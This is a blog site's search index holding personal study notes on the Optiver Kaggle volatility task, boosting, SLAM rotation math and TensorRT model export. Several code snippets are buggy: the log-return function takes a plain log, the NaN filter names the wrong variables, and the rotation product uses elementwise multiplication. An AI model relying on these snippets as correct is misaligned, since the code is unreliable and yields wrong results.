<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Optiver Realized Volatility Prediction</title>
      <link href="/2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/"/>
      <url>/2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/</url>
      
        <content type="html"><![CDATA[<p>以后写kaggle尽量都用一些实用性的算法，该面向简历编程了，论文阅读笔记之类的以后都尽量用英语写</p><a id="more"></a><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Optiver Realized Volatility Prediction Competition.<br>This kaggle project is about trying diff methods to predict the volatility of a trading floor for trading firms,The Accurate Volatility, which is essencial for their investing options.Also is an essencial data standard related to the price of underlying product.<br>IN short, We have to find the most effective approach to minus RMSPE.</p><h3 id="Given-Data"><a href="#Given-Data" class="headerlink" title="Given Data"></a>Given Data</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataset</span><br><span class="line">├── book_test.parquet</span><br><span class="line">├── book_train.parquet</span><br><span class="line">├── trade_test.parquet</span><br><span class="line">└── trade_train.parquet</span><br></pre></td></tr></table></figure><p>Each folder contains stock_id=n<br><strong>trade</strong> [‘time_id’, ‘seconds_in_bucket’, ‘price’, ‘size’, ‘order_count’]<br><strong>book</strong> [‘time_id’, ‘seconds_in_bucket’, ‘bid_price1’, ‘ask_price1’, ‘bid_price2’, ‘ask_price2’, ‘bid_size1’, ‘ask_size1’, ‘bid_size2’, ‘ask_size2’],<br><strong>train</strong> [‘stock_id’,’time_id’,’target’]<br><strong>test</strong> [‘stock_id’,’time_id’,’row_id’]</p><h3 id="financial-concepts"><a href="#financial-concepts" class="headerlink" title="financial concepts"></a>financial concepts</h3><p>show case:</p><table><thead><tr><th align="center">bid</th><th align="center">price</th><th align="center">ask</th></tr></thead><tbody><tr><td align="center"></td><td align="center">151</td><td align="center">196</td></tr><tr><td align="center"></td><td align="center">150</td><td align="center">189</td></tr><tr><td align="center"></td><td align="center">149</td><td align="center">148</td></tr><tr><td align="center"></td><td align="center">148</td><td align="center">221</td></tr><tr><td align="center">251</td><td align="center">147</td><td align="center"></td></tr><tr><td align="center">351</td><td align="center">146</td><td align="center"></td></tr><tr><td align="center">300</td><td align="center">145</td><td align="center"></td></tr><tr><td align="center">20</td><td align="center">144</td><td align="center"></td></tr><tr><td align="center"><em>1.Content of an order book</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- A list of buy or sell records sorted by price, which lists the number of shares being bid on or offered at each price point.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- in the case of given data,’bid’ means <em>How many shares the Buyer want to buy</em> , ‘ask’ means <em>How many shares Sellers offer</em>.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>EACH order book&amp;trade book belongs to 1 kind of stock</strong></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><em>2.Trade procedure</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- a TRADE HAPPENS when the shares of stock that seller S offers and buyer B bids  at the same price.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- B can up his/her intended price and buy the offered by S.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><em>3.Liquidity</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">there’re some statistics standards for analyser to estimate the liquidity of an order book.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- WAP(weighted avaraged price)takes the price level and size of orders</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">$$wap = \frac{bidprice1<em>asksize1+askprice1</em>bidsize1}{asksize1+bidsize1}$$</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Code for WAP caculation, add one column as ‘wap’</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">book_parquet[<span class="string">'wap'</span>] = </span><br><span class="line">(book_parquet[<span class="string">'bid_price1'</span>] * book_parquet[<span class="string">'ask_size1'</span>] + </span><br><span class="line">book_parquet[<span class="string">'ask_price1'</span>] * book_parquet[<span class="string">'bid_size1'</span>])</span><br><span class="line">/(book_parquet[<span class="string">'bid_size1'</span>]+ book_parquet[<span class="string">'ask_size1'</span>])</span><br></pre></td></tr></table></figure></td><td align="center"></td><td align="center"></td></tr></tbody></table><p><em>4.Log returns</em><br>another vital standard for comparing the price of a stock in yesterday and today<br>calling $S_t$ is the price of stock at time $t$ ,the log return is $r_{t1,t2}$,<br>$$r_{t_1, t_2} = \log{\frac{S_{t_2}}{S_{t_1}}}$$<br>Noticed <strong>The host wants competitors should use WAP to compute log returns, and assuming that log returns have 0 mean</strong><br>Then the Code for LogReturn is as follows and add it to book table.<br>Additionally we should expire the NaN row:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LogReturn</span><span class="params">(WAP)</span>:</span></span><br><span class="line"><span class="keyword">return</span> np.log(WAP)</span><br><span class="line">book_parquet[<span class="string">'logreturn'</span>] = LogReturn(book_parquet)</span><br><span class="line"><span class="comment">#expire NaN items</span></span><br><span class="line">book_parquet = book_parquet[~book_example[<span class="string">'log_return'</span>].isnull()]</span><br></pre></td></tr></table></figure><p><em>5.Realized Volatility</em><br>Volatility is described as ‘the annualized standard deviation of one year’s LogReturn’<br>$$\sigma = \sqrt{\sum\limits_t{r^2_{t-1,t}}}$$</p><p>For each stock data, we find that different stock have different volatility characteristics, So one column should be added as ‘stock_id’, using</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stock_id = i</span><br><span class="line">book_parquet.loc[:,<span class="string">'stock_id'</span>] = stock_id</span><br></pre></td></tr></table></figure><h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><p>The evaluation metric is Root Mean Square Percentage Error, as:<br>$$\text{RMSPE} = \sqrt{\frac{1}{n} \sum_{i=1}^{n} ((y_i - \hat{y}_i)/y_i)^2}$$<br>The formula above can be implemented as:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RMSPE</span><span class="params">(yhat, data)</span>:</span></span><br><span class="line">y = data.get_label()</span><br><span class="line">elements = ((y - yhat) / y) ** <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span> float(np.sqrt(np.sum(elements) / len(y)))</span><br></pre></td></tr></table></figure><h2 id="Method-s"><a href="#Method-s" class="headerlink" title="Method(s)"></a>Method(s)</h2><p>I looked through the Discussion board, found most are using <em>XGBoost</em> and <em>LightGBT</em>, I get begin from  DataProcessing module and the baseline is implemented with XGBoost, LightGBT will be done later.</p><h3 id="data-processing"><a href="#data-processing" class="headerlink" title="data processing"></a>data processing</h3><p>First check how we should process the parquet file.<br><strong>Parquet</strong>  is a <a href="http://en.wikipedia.org/wiki/Column-oriented_DBMS" target="_blank" rel="noopener">columnar storage</a> format available to any project in the Hadoop ecosystem, regardless of the choice of data processing framework, data model or programming language.<br>Hoster provided code for process the columnar file.<br><strong>and, I’m goin to try to run this method and data on Spark</strong>, The code will be release later on github.<br>Process code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h2><p>you can use <a href="https://lightgbm.readthedocs.io/en/latest/pythonapi/lightgbm.plot_importance.html" target="_blank" rel="noopener">https://lightgbm.readthedocs.io/en/latest/pythonapi/lightgbm.plot_importance.html</a> to see the feature importance of your model.</p>]]></content>
      
      
      <categories>
          
          <category> kaggle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> kaggle </tag>
            
            <tag> Boosting </tag>
            
            <tag> xgboost </tag>
            
            <tag> GBDT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>统计学习笔记(后篇)</title>
      <link href="/2021/07/01/2021-07-01-statics_note/"/>
      <url>/2021/07/01/2021-07-01-statics_note/</url>
      
        <content type="html"><![CDATA[<p>接上一篇统计学习笔记，最近在做kaggle，用到了Boost算法，有机会把以前笔记剩余部分的补上了。</p><a id="more"></a><h2 id="Boost"><a href="#Boost" class="headerlink" title="Boost"></a>Boost</h2><p>一句话概括Boost方法就是：将N个弱学习算法构建成一个相当于强学习算法的方法。重点记录AdaBoost和XGBoost两个模型，也是实际应用中广泛使用的方法，效果和时间性能很好。<br>sklearn的ensemble里封装了AdaBoostClassifier，以后写一个kaggle常用的sklearnAPI总结吧。<br>Adaboost解决两个问题</p><ul><li>每一轮如何改变训练数据的权值或者概率分布</li><li>如何将N个弱学习模型组合成一个强学习模型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.通过在n个训练样本上迭代得到第一个弱分类器C1</span><br><span class="line">2.将分错的样本和其他的新数据构建新训练样本n，在这上面迭代得到C2</span><br><span class="line">3.将1.2.都分错的样本和新数据构建新训练样本n，迭代得到C3</span><br><span class="line">4.</span><br></pre></td></tr></table></figure></li></ul><p>设有J个弱分类器，训练样本(X,Y),n维，Adaboost算法流程如下 ，</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Boost </tag>
            
            <tag> AdaBoost </tag>
            
            <tag> XGBoost </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3D重建及其深度学习方法的相关论文解析</title>
      <link href="/2021/05/13/2021-05-13-3D%E8%A7%86%E8%A7%89_%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA/"/>
      <url>/2021/05/13/2021-05-13-3D%E8%A7%86%E8%A7%89_%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>最近实习在读浙大最近的NeuralRecon，里面涉及到一些3D点云处理的数学方法和3DVison的深度学习Tricks，主要包括TSDF算法，特征点提取的SIFT、ORB两种算法，及稀疏卷积等，以及SLAM(simultaneous localization and mapping)基础，从《视觉SLAM十四讲》（高翔等）学习基础。双目算法现在已经比较成熟，目前自己工作只涉及单目相机。</p><a id="more"></a><h2 id="SLAM框架"><a href="#SLAM框架" class="headerlink" title="SLAM框架"></a>SLAM框架</h2><h3 id="视觉里程计（Visual-Odometry）"><a href="#视觉里程计（Visual-Odometry）" class="headerlink" title="视觉里程计（Visual Odometry）"></a>视觉里程计（Visual Odometry）</h3><p>目前项目的硬件设备由单目相机获取信息，进而进行姿态估计、深度估计等计算。<br>简单来说，VO是由相邻两张图片间像素的位置关系估计相机的位置，</p><h4 id="坐标变换-旋转矩阵"><a href="#坐标变换-旋转矩阵" class="headerlink" title="坐标变换 旋转矩阵"></a>坐标变换 旋转矩阵</h4><p>求相机坐标系（o）到世界坐标系（w）下的旋转矩阵$R^o_w$，进行欧式变换可以将o下的向量$p_o$ 转换到w下向量$p_w$<br>求出刚体旋转矩阵$R^o_w$，那么w下向量$p_w$左乘R就可以转化到$p_o$:<br>$p_o = R^o_w  \cdot\ p_w$<br>同理如果两个坐标系下的旋转矩阵可以得到<br>$m = $<br><strong>eg.</strong> 下面是由w到o1 和o2两个旋转矩阵传递得到的o1 -&gt; o2的旋转矩阵<br>设两个相机坐标系下o1,o2对应的三个点a b c，d e f，各获得两个向量 $m1,n1$,$m2,n2$<br>分别构建出该点集合所在的坐标系方程，求解得到世界坐标到o1 , o2的旋转坐标$R_1,R_2$， 则有：世界坐标系向量$m2 = R_1^T \cdot R_2 \cdot m1$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def RigidBody_Transform(p=np.zeros((3,3),dtype=float), q=np.zeros((3,3),dtype=float)):</span><br><span class="line">    # 世界坐标到 O1的旋转矩阵 ，x = x / ||x|| 单位化</span><br><span class="line">    x = (p[1,:] - p[0,:]) / np.linalg.norm(p[1,:] - p[0,:]) </span><br><span class="line">    y = (p[2,:] - p[1,:]) - np.inner(np.inner((p[2,:] - p[1,:]),x), x)</span><br><span class="line">    y = y / np.linalg.norm(y) # y_bar = y / ||y|| # 单位化第二行</span><br><span class="line">    print(&quot;x&quot;,x)</span><br><span class="line">    print(&quot;y&quot;,y)</span><br><span class="line">    z = np.cross(x, y) #叉乘</span><br><span class="line">    print(&quot;z&quot;,z)</span><br><span class="line">    rotate_matrix_w2o1 = np.array([x, y, z])</span><br><span class="line">    # 世界坐标到  O2的转转矩阵</span><br><span class="line">    x_new = (q[1,:] - q[0,:]) / np.linalg.norm(q[1,:] - q[0,:]) </span><br><span class="line">    y_new = (q[2,:] - q[1,:]) - np.inner(np.inner((q[2,:] - q[1,:]),x_new), x_new)</span><br><span class="line">    y_new = y_new / np.linalg.norm(y_new)</span><br><span class="line">    # 这里要注意，叉积（cross product）和 外积（outer product）不一样</span><br><span class="line">    # ps:国内教材讲的是叉积和外积一样</span><br><span class="line">    # np.cross算叉积 ，np.outer算外积</span><br><span class="line">    z_new = np.cross(x_new, y_new) #这要计算的是叉积（只有三维空间有意义，就是右手系的那个）</span><br><span class="line">    rotate_matrix_w2o2 = np.array([x_new, y_new, z_new])</span><br><span class="line">    return rotate_matrix_w2o1,rotate_matrix_w2o2, (rotate_matrix_w2o1.T * rotate_matrix_w2o2)</span><br><span class="line"></span><br><span class="line">#p = np.array([(-47.34,-18.71,-155.02), (-73.64,-29.82,-210.88), (-64.88,-36.77,-216.15)])</span><br><span class="line">#p = np.array([(-4.34,-36.71,51), (-30,25.5,-4), (-21,18,-10.15)])</span><br><span class="line">#q = np.array([(-40,25.5,6), (-30,25.5,-4), (15.01,55.19,22.818)])</span><br><span class="line">p = np.array([(0,1,0), (0,0,0), (0,0,1)])</span><br><span class="line">q = np.array([(0,-1,0), (0,0,0), (0,0,-1)])</span><br><span class="line">m1,m2,rotate_matrix = RigidBody_Transform(p, q)</span><br><span class="line">print(&quot;rotate_matrix is:\n&quot;)</span><br><span class="line">print(rotate_matrix)</span><br></pre></td></tr></table></figure><h4 id="旋转向量"><a href="#旋转向量" class="headerlink" title="旋转向量"></a>旋转向量</h4><p>上面的旋转矩阵表示具有局限性，原因是求出的矩阵必须是正交阵，优化时比较困难，并且计算量比较大，需要进行矩阵运算，一次运算需要9次浮点乘法，所以又提出一个用<strong>旋转角和旋转轴</strong>表示一个<strong>旋转向量</strong>的描述旋转的方法。同时，旋转向量也可以转换成旋转矩阵:<br>由<strong>罗德里格斯公式(Rodrigus’ Formula)</strong>，n_r 即n^，表示向量n到n对应的反对称矩阵的转换符，计算如下：<br>$a \times b=\begin{Vmatrix} e_1&amp;e_2&amp;e_3\\a_1&amp;a_2&amp;a_3\\b_1&amp;b_2&amp;b_3 \end{Vmatrix}=\begin{bmatrix} a_2b_3-a_3b_2\\a_3b_1-a_1b_3\\a_1b_2-a_2b_1 \end{bmatrix}=\begin{bmatrix}0&amp;-a_3&amp;a_2\\a_3&amp;0&amp;-a_1\\ -a_2&amp;a_1&amp;0\end{bmatrix} \cdot b = a$^$b$<br>上面的$a$^ 表示其对应的反对称矩阵<br>$R = cos \theta I  + (1-cos\theta) n \cdot n^T + sin\theta n$^<br>求转角$\theta$，可以：<br>$tr(R)= \cos\theta tr(I) +(1-\cos\theta)tr(n \cdot n^T) +\sin\theta tr(n$^$)$<br>$\quad\quad =3\cos\theta +(1-\cos\theta) = 1+2\cos\theta$<br>求出$\theta = \arccos \frac{tr(R)-1}{2}$</p><h3 id="回环检测（Loop-Closure-Detection）"><a href="#回环检测（Loop-Closure-Detection）" class="headerlink" title="回环检测（Loop Closure Detection）"></a>回环检测（Loop Closure Detection）</h3><p>判断镜头是否到达过先前位置，和后端（优化）解决因里程计每次计算相邻两张图片的位置关系，每次前后误差叠加出现的<strong>漂移</strong>问题，简而言之就是校正。</p><h3 id="后端优化（非线性）"><a href="#后端优化（非线性）" class="headerlink" title="后端优化（非线性）"></a>后端优化（非线性）</h3><p>接受VO获得的相机位姿、回环检测</p><h3 id="建图"><a href="#建图" class="headerlink" title="建图"></a>建图</h3><p>还没整理好</p><h2 id="3D点云模型"><a href="#3D点云模型" class="headerlink" title="3D点云模型"></a>3D点云模型</h2><h3 id="相机模型"><a href="#相机模型" class="headerlink" title="相机模型"></a>相机模型</h3><p>相机模型得到的相机内参(camera_intrinsic_perview)一般为一张图得到一个<br>通过两种模型<strong>针孔模型（PINHOLE，还有放射模型RADIAL）</strong>，<strong>畸变模型</strong>两种实现内参计算</p>]]></content>
      
      
      <categories>
          
          <category> 3DPointCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 3DPointCloud </tag>
            
            <tag> DeepLearning </tag>
            
            <tag> SLAM </tag>
            
            <tag> 3DVision </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NeuralRecon for 3D reconstruction in real-time</title>
      <link href="/2021/05/11/2021-05-11-summary_neucon/"/>
      <url>/2021/05/11/2021-05-11-summary_neucon/</url>
      
        <content type="html"><![CDATA[<p>图像pair 提取特征点算法<br>SIFT<br>SURF<br>ORB</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 3D vision </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 3DVision Projection TSDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DenseDescriptor for SfM Datasset Preparation</title>
      <link href="/2021/04/19/2021-04-20-DenseDescriptor/"/>
      <url>/2021/04/19/2021-04-20-DenseDescriptor/</url>
      
        <content type="html"><![CDATA[<p>一些单目三维重建的概念，及DepthEstimation代码的阅读</p><a id="more"></a><h2 id="4-19日-4月21日"><a href="#4-19日-4月21日" class="headerlink" title="4-19日-4月21日"></a>4-19日-4月21日</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Colmap提取的数据，SFMDataset用来初始化</span><br><span class="line"></span><br><span class="line">ColMap提取SFM数据，作为训练数据集，读取及处理方式</span><br></pre></td></tr></table></figure><h2 id="SLAM和ColMap两个生成数据-输入到DenseDescriptor的兼容性"><a href="#SLAM和ColMap两个生成数据-输入到DenseDescriptor的兼容性" class="headerlink" title="SLAM和ColMap两个生成数据,输入到DenseDescriptor的兼容性"></a>SLAM和ColMap两个生成数据,输入到DenseDescriptor的兼容性</h2><p>class:<br>SFMDataset</p><ul><li>Format</li></ul><hr><p>image_file_names        拆好的图像序列，有序<br>folder_list             data里面的文件夹train/data/1 train/data/2<br>adjandance_range        1 50 邻接范围,控制1-50的随机增量<br>image_downsampling      2.5 图像下采样倍数 resize到 原来的2.5x<br>network_downsampling    64 for downsample and crop mask的参数<br>inlier_percentage       0.99 阈值ground truth<br>load_intermediate_data  True/False 是否加载预计算数据，存在precompute的pickle文件里precompute.pkl<br>intermediate_data_root  precompute文件⬆️的path<br>sampling_size           10<br>heatmap_sigma        5.0 热图参数，用于generate_heatmap_from_locations,生成训练的sourcemap和targetmap<br>pre_workers             4<br>visible_interval         可视化间隔，，用在overlap点云的函数里，和读取colmapresult的函数一起预处理，避免点云密集，可以调整该参数控制稀疏程度。</p><h2 id="num-iter-每个epoch的迭代次数，训练的时候在看"><a href="#num-iter-每个epoch的迭代次数，训练的时候在看" class="headerlink" title="num_iter              每个epoch的迭代次数，训练的时候在看"></a>num_iter              每个epoch的迭代次数，训练的时候在看</h2><ul><li>precompute.pkl 按作者计算的程序来吧，反正按路径来就没问题</li></ul><hr><pre><code>      crop_positions_per_seq    selected_indexed_per_seqvisible_view_indexes_per_seq     point_cloud_per_seq    intrinsic_matrix_per_seq       mask_boundary_per_seq  view_indexes_per_point_per_seq      extrinsics_per_seq      projection_per_seq    clean_point_list_per_seq    image_downsampling   //这三个是    network_downsampling    inlier_percentage    // 符合ground trueth的阈值     estimated_scale_per_seq</code></pre><hr><h3 id="使用tensorrt生成engine进行推理"><a href="#使用tensorrt生成engine进行推理" class="headerlink" title="使用tensorrt生成engine进行推理"></a>使用tensorrt生成engine进行推理</h3><p><a href="https://zhuanlan.zhihu.com/p/351426774" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/351426774</a><br>c++ 写法、思路如下</p><ul><li><p>先将pytorch的Network先转成onnx模型。<br>如果使用DataParallel进行多GPU训练的话，需要注意节点前面的Module.<br>注意版本，某些函数是onnx默认运算符集不支持的函数，比如forbenius norm，只能转成Aten运算符，Aten运算符竟然没找到很好的文档，为了避免风险升级pytorch到 1.6，将运算符集合版本导出为11，支持了现在的大多数函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code here</span><br></pre></td></tr></table></figure></li><li><p>导出onnx在netron看一下，没问题就可以开始用C++转Trt模型，主要包括加载、解析onnx，序列化两个操作进行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> trtEngineName = <span class="string">"out.engine"</span>;</span><br><span class="line">sammple::Logger glogger; </span><br><span class="line">nvinfer1::IBuilder* builder = createInferBuilder(gLogger.getTRTLogger());<span class="comment">//createInferBuilder(ILogger&amp; logger);</span></span><br><span class="line">INetWorkDefinition* network = builder-&gt;createNetWorkV2(maxBatchSize);<span class="comment">//</span></span><br><span class="line">IBuilderConfig*     config  = builder-&gt;createBuilderConfig();</span><br><span class="line"><span class="keyword">auto</span> parser  =nvonnxparser::createParser(*network,gLogger.getTRTLogger());<span class="comment">// a parser for onnx</span></span><br><span class="line"></span><br><span class="line">builder-&gt;setMaxWorkspaceSize(<span class="number">1</span>_GiB);<span class="comment">//NVIDIA document claims "lets TensorRT pick any algorithm available."</span></span><br><span class="line">config-&gt;setMaxWorkspaceSize(<span class="number">1</span>_GiB);</span><br><span class="line"></span><br><span class="line">builder-&gt; setFp16Mode(gArgs.runInFp16);<span class="comment">//two inference mode, FP16 and Int8, Float16 is okay</span></span><br><span class="line"></span><br><span class="line">samplesCommon::enableDLA(builder, config, gArgs.useDLACore);<span class="comment">// DLA is to accelerate some layer // DALI to accelerate data reading</span></span><br><span class="line"></span><br><span class="line">ICudaEngine* engine = builder-&gt;buildCudaEngine(*network);<span class="comment">// build cudaengine of "NvInferRuntime.h"</span></span><br><span class="line"></span><br><span class="line">IHostMemory* trtModel = <span class="literal">nullptr</span>;<span class="comment">// init stream as null point</span></span><br><span class="line">trtModel = engine -&gt;serialize(); <span class="comment">// serialize the onnx model</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="function">ofstream <span class="title">ofs</span><span class="params">(trtEngineName.c_str(), <span class="built_in">std</span>::ios::out | <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line">ofs.write((<span class="keyword">char</span>*)(trtModel-&gt;data()), trtModel-&gt;size());</span><br><span class="line">ofs.close();</span><br></pre></td></tr></table></figure></li><li><p>上一步导出的模型为out.engine，下一步加载该TRT model（或CudaEngine）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TensorRT</span> &#123;</span></span><br><span class="line">IExecutionContext* context;</span><br><span class="line">ICudaEngine* engine;</span><br><span class="line">IRuntime* runtime;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">TensorRT* <span class="title">LoadNet</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* trtFileName)</span></span>&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="function">ifstream <span class="title">t</span><span class="params">(trtFileName, <span class="built_in">std</span>::ios::in | <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">stringstream</span> tempStream;</span><br><span class="line">tempStream &lt;&lt; t.rdbuf();</span><br><span class="line">t.close();</span><br><span class="line">DebugP(<span class="string">"TRT File Loaded"</span>);</span><br><span class="line"></span><br><span class="line">tempStream.seekg(<span class="number">0</span>, <span class="built_in">std</span>::ios::end);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> modelSize = tempStream.tellg();</span><br><span class="line">tempStream.seekg(<span class="number">0</span>, <span class="built_in">std</span>::ios::beg);</span><br><span class="line"><span class="keyword">void</span>* modelMem = <span class="built_in">malloc</span>(modelSize);</span><br><span class="line">tempStream.read((<span class="keyword">char</span>*)modelMem, modelSize);</span><br><span class="line"></span><br><span class="line">IRuntime* runtime = createInferRuntime(gLogger);</span><br><span class="line"><span class="keyword">if</span> (runtime == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Runtime Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (gArgs.useDLACore &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">runtime-&gt;setDLACore(gArgs.useDLACore);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ICudaEngine* engine = runtime-&gt;deserializeCudaEngine(modelMem, modelSize, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (engine == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Engine Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IExecutionContext* context = engine-&gt;createExecutionContext();</span><br><span class="line"><span class="keyword">if</span> (context == <span class="literal">nullptr</span>)</span><br><span class="line">&#123;</span><br><span class="line">DebugP(<span class="string">"Build Context Failure"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TensorRT* trt = <span class="keyword">new</span> TensorRT();</span><br><span class="line">trt-&gt;context = context;</span><br><span class="line">trt-&gt;engine = engine;</span><br><span class="line">trt-&gt;runtime = runtime;</span><br><span class="line">DebugP(<span class="string">"Build trt Model Success!"</span>);</span><br><span class="line"><span class="keyword">return</span> trt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 3DPointCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DeepLearning </tag>
            
            <tag> 3DPointclouod </tag>
            
            <tag> DepthEstimation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨媒体检索/多模态计算 方向动态</title>
      <link href="/2021/04/08/2021-04-08-%E5%9B%BE%E5%83%8F%E8%A7%86%E9%A2%91%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96%E4%B8%8E%E6%A3%80%E7%B4%A2/"/>
